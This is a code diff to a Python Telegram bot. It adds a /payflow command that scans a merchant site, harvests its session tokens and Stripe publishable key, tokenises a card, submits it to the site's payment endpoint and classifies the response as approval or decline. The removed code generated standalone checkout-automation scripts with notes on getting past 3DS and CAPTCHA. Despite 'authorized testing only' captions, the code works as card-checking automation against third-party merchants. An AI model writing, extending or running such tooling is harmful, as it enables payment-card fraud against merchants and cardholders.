-            "    print(f'[!] 3DS Challenge required → {acs_url}')",
-            "    print('[!] Browser interaction needed to complete 3DS — automate with Playwright/Selenium')",
-            '    # Submit PaReq to ACS URL:',
-            "    # s.post(acs_url, data={'PaReq': pa_req, 'MD': md, 'TermUrl': ENDPOINT})",
-            'else:',
-            "    print('[*] No 3DS redirect detected in response')",
-        ]
-        steps.append({
-            'step':    step_num,
-            'title':   '3DS / SCA Handling',
-            'notes':   '3DS signals were detected on this site. If the POST returns an ACS URL, card authentication is required. Full automation requires a headless browser.',
-            'warning': '3DS requires browser interaction — full automation needs Playwright or Selenium.',
-            'code':    '\n'.join(_3ds_code),
-        })
-        code_lines += _3ds_code + ['']
-
-    bp['steps'] = steps
-
-    # ── Full script ───────────────────────────────────────────
-    header = [
-        '#!/usr/bin/env python3',
-        f'# Blueprint: {domain}',
-        f'# Gateway: {gw_name}  |  Generated: {now}',
-        '# FOR AUTHORIZED SECURITY TESTING ONLY',
-        '# ━' * 36,
-        '',
-    ]
-    bp['full_script'] = '\n'.join(header + code_lines)
-
-    safe = _sanitize_for_json(bp)
-    return json.dumps(safe, indent=2, ensure_ascii=False)
-
-
-# ══════════════════════════════════════════════════════════════
 # ── CMD HANDLER ───────────────────────────────────────────────
 # ══════════════════════════════════════════════════════════════
 
@@ -35308,52 +35157,41 @@ async def cmd_payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception:
             pass
 
-    # ── Intelligence Report export ─────────────────────────────
+    # ── Payment Flow JSON export ───────────────────────────────
     try:
-        intel_str  = _build_intelligence_report(data)
-        _safe_domain = re.sub(r'[^\w\-]', '_', domain)[:36]
-        intel_name = f"intel_{_safe_domain}.json"
-        intel_tmp  = os.path.join(tempfile.gettempdir(), intel_name)
-        with open(intel_tmp, 'w', encoding='utf-8') as f:
-            f.write(intel_str)
-        with open(intel_tmp, 'rb') as f:
-            await update.effective_message.reply_document(
-                document=f,
-                filename=intel_name,
-                caption=(
-                    f"🔍 *Intelligence Report — `{escape_md(domain)}`*\n"
-                    f"Endpoints · Parameters · Auth Surface · Risk Summary"
-                ),
-                parse_mode='Markdown'
-            )
-        os.unlink(intel_tmp)
-    except Exception as e:
-        logger.warning(f"intelligence report export error: {e}")
+        flow_str  = _build_payment_flow_json(data)
+        flow_name = f"flow_{re.sub(r'[^\w\-]', '_', domain)[:36]}.json"
+        flow_tmp  = os.path.join(tempfile.gettempdir(), flow_name)
+        with open(flow_tmp, 'w', encoding='utf-8') as f:
+            f.write(flow_str)
 
-    # ── Blueprint export ───────────────────────────────────────
-    try:
-        bp_str  = _build_blueprint(data)
-        _safe_domain_bp = re.sub(r'[^\w\-]', '_', domain)[:34]
-        bp_name = f"blueprint_{_safe_domain_bp}.json"
-        bp_tmp  = os.path.join(tempfile.gettempdir(), bp_name)
-        with open(bp_tmp, 'w', encoding='utf-8') as f:
-            f.write(bp_str)
-        with open(bp_tmp, 'rb') as f:
-            gw_name = data['gateways'][0]['name'] if data.get('gateways') else '—'
+        # Count steps with real data for caption
+        _flow_obj    = json.loads(flow_str)
+        _gw_caption  = _flow_obj.get('meta', {}).get('gateway', '—')
+        _step_count  = len(_flow_obj.get('steps', []))
+        _has_captcha = bool(data.get('recaptcha', {}).get('site_key'))
+        _has_3ds     = bool(data.get('threeds_signals'))
+
+        _flow_tags = '  '.join(filter(None, [
+            f"💳 {escape_md(_gw_caption)}",
+            '🤖 CAPTCHA' if _has_captcha else None,
+            '🔐 3DS'     if _has_3ds     else None,
+        ]))
+
+        with open(flow_tmp, 'rb') as f:
             await update.effective_message.reply_document(
                 document=f,
-                filename=bp_name,
+                filename=flow_name,
                 caption=(
-                    f"🗺️ *Blueprint — `{escape_md(domain)}`*\n"
-                    f"Gateway: `{escape_md(gw_name)}` · "
-                    f"Steps: `{len(data.get('forms', []))  + (1 if data.get('recaptcha') else 0) + 4}`\n"
-                    f"_Standalone Python script included_"
+                    f"🔀 *Payment Flow — `{escape_md(domain)}`*\n"
+                    f"{_flow_tags}\n"
+                    f"Step 1 GET · Step 2 Stripe · Step 3 POST · Step 4 Logic"
                 ),
                 parse_mode='Markdown'
             )
-        os.unlink(bp_tmp)
+        os.unlink(flow_tmp)
     except Exception as e:
-        logger.warning(f"blueprint export error: {e}")
+        logger.warning(f"payment flow JSON export error: {e}")
 
 
 # ══════════════════════════════════════════════════════════════
@@ -35725,6 +35563,263 @@ def _payloadlive_sync(url: str, on_request_cb, stop_event, timeout_sec: int = 18
 
     except Exception as e:
         on_request_cb(f"❌ Playwright error: `{escape_md(str(e))}`")
+
+
+async def cmd_payflow(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/payflow <url> — Run full 4-step payment flow simulation (GET→Stripe→POST→Classify)"""
+    if not context.args:
+        await update.effective_message.reply_text(
+            "🔀 *PayFlow — 4-Step Payment Simulation*\n"
+            "`/payflow <url>`\n\n"
+            "*Step 1*  Session init · cookies · CSRF token\n"
+            "*Step 2*  Stripe tokenization · pk\\_ key · tok\\_xxx\n"
+            "*Step 3*  POST to site endpoint · full body\n"
+            "*Step 4*  Response classify · verdict · codes\n\n"
+            "⚠️ _Authorized testing only\\. Test cards only\\._",
+            parse_mode='MarkdownV2'
+        )
+        return
+
+    uid = update.effective_user.id
+    allowed, wait = check_rate_limit(uid)
+    if not allowed:
+        await update.effective_message.reply_text(
+            f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        return
+
+    url = context.args[0].strip()
+    if not url.startswith('http'):
+        url = 'https://' + url
+
+    safe_ok, reason = is_safe_url(url)
+    if not safe_ok:
+        await update.effective_message.reply_text(
+            f"🚫 `{escape_md(reason)}`", parse_mode='Markdown')
+        return
+
+    domain = urlparse(url).hostname or url
+
+    # ── Step 0: Run /payload scan first to get data dict ─────────
+    msg = await update.effective_message.reply_text(
+        f"🔀 *PayFlow — `{escape_md(domain)}`*\n\n"
+        f"⏳ Phase 0: Running payload scan...",
+        parse_mode='Markdown'
+    )
+
+    loop           = asyncio.get_event_loop()
+    progress_queue: asyncio.Queue = asyncio.Queue()
+
+    def progress_cb(text: str):
+        loop.call_soon_threadsafe(progress_queue.put_nowait, text)
+
+    async def progress_editor():
+        """Drain queue, throttle-edit Telegram message."""
+        import time as _time
+        last_edit = 0.0
+        last_text = ''
+        while True:
+            try:
+                item = await asyncio.wait_for(progress_queue.get(), timeout=0.5)
+            except asyncio.TimeoutError:
+                task_obj = _user_tasks.get(uid)
+                if task_obj and task_obj.done():
+                    break
+                continue
+            if item is None:
+                break
+            now = _time.monotonic()
+            new_text = (
+                f"🔀 *PayFlow — `{escape_md(domain)}`*\n\n"
+                f"⏳ {escape_md(str(item)[:120])}"
+            )
+            if new_text != last_text and now - last_edit >= 3.0:
+                last_text = new_text
+                last_edit = now
+                try:
+                    await msg.edit_text(new_text, parse_mode='Markdown')
+                except Exception:
+                    pass
+
+    editor_task = asyncio.create_task(progress_editor())
+
+    # ── Phase 0: /payload scan ────────────────────────────────────
+    try:
+        data = await run_scan(uid, _payload_sync, url, progress_cb)
+    except asyncio.CancelledError:
+        loop.call_soon_threadsafe(progress_queue.put_nowait, None)
+        editor_task.cancel()
+        await msg.edit_text("🛑 Cancelled.", parse_mode='Markdown')
+        return
+    except Exception as e:
+        loop.call_soon_threadsafe(progress_queue.put_nowait, None)
+        editor_task.cancel()
+        await msg.edit_text(
+            f"❌ Payload scan failed: `{escape_md(str(e)[:100])}`",
+            parse_mode='Markdown')
+        return
+
+    # ── Guard: must have a payment endpoint ──────────────────────
+    _all_e = data.get('forms', []) + data.get('requests', [])
+    _pay_e = next(
+        (e for e in _all_e if e.get('is_payment') and e.get('action')),
+        next((e for e in _all_e if e.get('action')), None)
+    )
+    if not _pay_e:
+        loop.call_soon_threadsafe(progress_queue.put_nowait, None)
+        editor_task.cancel()
+        await msg.edit_text(
+            f"🔀 *PayFlow — `{escape_md(domain)}`*\n\n"
+            f"❌ No payment endpoint found — cannot run flow.",
+            parse_mode='Markdown')
+        return
+
+    # ── Phase 1-4: Run flow ──────────────────────────────────────
+    progress_cb("🚀 Starting 4-step flow...")
+
+    try:
+        flow_result = await run_scan(
+            uid, _run_payload_flow_sync, data, progress_cb)
+    except asyncio.CancelledError:
+        loop.call_soon_threadsafe(progress_queue.put_nowait, None)
+        editor_task.cancel()
+        await msg.edit_text("🛑 Cancelled.", parse_mode='Markdown')
+        return
+    except Exception as e:
+        loop.call_soon_threadsafe(progress_queue.put_nowait, None)
+        editor_task.cancel()
+        await msg.edit_text(
+            f"❌ Flow error: `{escape_md(str(e)[:100])}`",
+            parse_mode='Markdown')
+        return
+
+    # Stop progress editor
+    loop.call_soon_threadsafe(progress_queue.put_nowait, None)
+    try:
+        await asyncio.wait_for(editor_task, timeout=2.0)
+    except Exception:
+        editor_task.cancel()
+
+    # ── Format flow result ────────────────────────────────────────
+    _verdict = flow_result.get('verdict', '❓ UNKNOWN')
+    _status  = flow_result.get('http_status', '?')
+    _tok     = flow_result.get('stripe_token', '')
+    _pk      = flow_result.get('stripe_pk_used', '')
+    _card    = flow_result.get('stripe_card_info') or {}
+    _succ    = flow_result.get('success_signals', [])
+    _decl    = flow_result.get('decline_signals', [])
+    _rcodes  = flow_result.get('response_codes', [])
+    _scodes  = flow_result.get('stripe_codes', [])
+    _rtoks   = flow_result.get('resolved_tokens_used', {})
+    _rbody   = flow_result.get('response_body', '')
+    _redir   = flow_result.get('redirect_url', '')
+    _err     = flow_result.get('error', '')
+
+    lines = [
+        f"🔀 *PayFlow — `{escape_md(domain)}`*",
+        f"*Verdict:* {escape_md(_verdict)}\n",
+    ]
+
+    # Error shortcut
+    if _err:
+        lines.append(f"❌ *Error:* `{escape_md(_err)}`")
+        await msg.edit_text('\n'.join(lines), parse_mode='Markdown')
+        return
+
+    # Step summary
+    lines.append("*── Step Summary ──────────────────*")
+    lines.append(
+        f"1️⃣ Session   `{len(_rtoks)}` token(s) resolved"
+    )
+    if _tok:
+        lines.append(
+            f"2️⃣ Stripe    `{escape_md(_tok[:16])}…`  "
+            + (f"brand:`{escape_md(_card.get('brand','?'))}`  "
+               f"last4:`{escape_md(_card.get('last4','?'))}`"
+               if _card else '')
+        )
+    else:
+        lines.append("2️⃣ Stripe    — skipped or failed")
+
+    lines.append(
+        f"3️⃣ Submit    HTTP `{_status}`"
+        + (f"  → `{escape_md(_redir[:50])}`" if _redir else '')
+    )
+    lines.append(
+        f"4️⃣ Classify  pattern=`{escape_md(flow_result.get('pattern_verdict','?'))}`  "
+        f"http=`{escape_md(flow_result.get('http_verdict','?'))}`"
+    )
+
+    # Signals
+    if _succ:
+        lines.append(f"\n✅ *Success signals* ({len(_succ)}):")
+        for s in _succ[:4]:
+            lines.append(f"  • {escape_md(s.get('label','')[:70])}")
+    if _decl:
+        lines.append(f"\n🔴 *Decline signals* ({len(_decl)}):")
+        for d in _decl[:4]:
+            lines.append(f"  • {escape_md(d.get('label','')[:70])}")
+        for sc in _scodes[:3]:
+            lines.append(
+                f"  💳 `{escape_md(sc.get('code',''))}` — "
+                f"_{escape_md(sc.get('description','')[:60])}_"
+            )
+    if _rcodes:
+        lines.append("\n📋 *ISO 8583 codes:*")
+        for rc_item in _rcodes[:3]:
+            lines.append(
+                f"  `{escape_md(rc_item.get('code',''))}` "
+                f"{escape_md(rc_item.get('meaning',''))} "
+                f"— {escape_md(rc_item.get('verdict',''))}"
+            )
+
+    # Resolved tokens used
+    if _rtoks:
+        lines.append(f"\n🔑 *Tokens injected* ({len(_rtoks)}):")
+        for tname, tval in list(_rtoks.items())[:4]:
+            lines.append(
+                f"  `{raw_code(tname, 24)}` = `{raw_code(tval, 24)}`"
+            )
+
+    # Response snippet
+    if _rbody:
+        _snippet = _rbody[:200].replace('\n', ' ').strip()
+        lines.append(f"\n📄 *Response snippet:*")
+        lines.append(f"`{escape_md(_snippet)}`")
+
+    lines.append("\n⚠️ _Authorized testing only\\._")
+
+    report_text = '\n'.join(lines)
+
+    # Smart chunk + send
+    try:
+        await msg.edit_text(report_text[:4000], parse_mode='Markdown')
+    except Exception:
+        await update.effective_message.reply_text(
+            report_text[:4000], parse_mode='Markdown')
+
+    # ── Flow JSON export ──────────────────────────────────────────
+    try:
+        # Attach flow_result to data for _build_payment_flow_json
+        data['flow_result'] = flow_result
+        flow_str  = _build_payment_flow_json(data)
+        flow_name = f"flow_{re.sub(r'[^\\w\\-]', '_', domain)[:36]}.json"
+        flow_tmp  = os.path.join(tempfile.gettempdir(), flow_name)
+        with open(flow_tmp, 'w', encoding='utf-8') as f:
+            f.write(flow_str)
+        with open(flow_tmp, 'rb') as f:
+            await update.effective_message.reply_document(
+                document=f,
+                filename=flow_name,
+                caption=(
+                    f"🔀 *PayFlow JSON — `{escape_md(domain)}`*\n"
+                    f"Verdict: `{escape_md(_verdict)}`  |  "
+                    f"HTTP: `{_status}`"
+                ),
+                parse_mode='Markdown'
+            )
+        os.unlink(flow_tmp)
+    except Exception as e:
+        logger.warning(f"payflow JSON export error: {e}")
 
 
 async def cmd_payloadlive(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -41570,6 +41665,7 @@ def main():
     app.add_handler(CommandHandler("paykeys",         cmd_paykeys))
     app.add_handler(CommandHandler("payload",         cmd_payload))
     app.add_handler(CommandHandler("payloadlive",    cmd_payloadlive))
+    app.add_handler(CommandHandler("payflow",        cmd_payflow))
     app.add_handler(CommandHandler("verifykeys",      cmd_verifykeys))
     app.add_handler(CommandHandler("socialkeys",      cmd_socialkeys))
     app.add_handler(CommandHandler("analytics",       cmd_analytics))
@@ -41687,6 +41783,7 @@ def main():
                     BotCommand("bypass403",   "403 bypass tester"),
                     BotCommand("payload",     "Request payload structure extractor"),
                     BotCommand("payloadlive", "Realtime network request stream"),
+                    BotCommand("payflow",     "4-step payment flow simulation"),
                     BotCommand("fuzz",        "Path & param fuzzer"),
                     BotCommand("smartfuzz",   "Context-aware smart fuzzer"),
                     BotCommand("monitor",     "Page change alert monitor"),
